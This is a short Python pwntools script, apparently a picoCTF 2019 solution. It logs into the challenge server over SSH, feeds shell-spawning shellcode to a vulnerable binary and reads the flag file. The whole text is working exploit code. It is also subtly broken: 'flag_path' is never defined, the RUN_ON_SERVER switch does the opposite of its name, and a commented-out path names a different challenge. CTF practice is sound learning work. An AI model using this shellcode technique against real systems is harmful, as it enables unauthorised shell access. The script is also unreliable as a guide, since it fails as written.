import pwn
import sys

dst="2019shell1.picoctf.com"
user=""
pw=""

remote_binary = "/problems/overflow-0_4_e130f4df1710865981d50f778a8059f7/vuln"

#pwn.context.log_level = 'debug'
#pwn.context.binary = "./handy-shellcode/vuln"
#pwn.context.terminal = ["tmux","splitw","-v"]

RUN_ON_SERVER = False
conn = None

try:
    if RUN_ON_SERVER:
        proc = pwn.process(['./vuln','A'*256])
    else:
        conn = pwn.ssh(host=dst,user=user,password=pw)
        proc = conn.process(remote_binary)

    proc.sendline(pwn.asm(pwn.shellcraft.i386.linux.sh()))
    proc.sendlineafter(b';', ("cat {}".format(flag_path)).encode())
    proc.interactive()
except Exception as e:
    print(e)
except KeyboardInterrupt:
    pass 
finally:
    if not RUN_ON_SERVER and conn:
        conn.close()
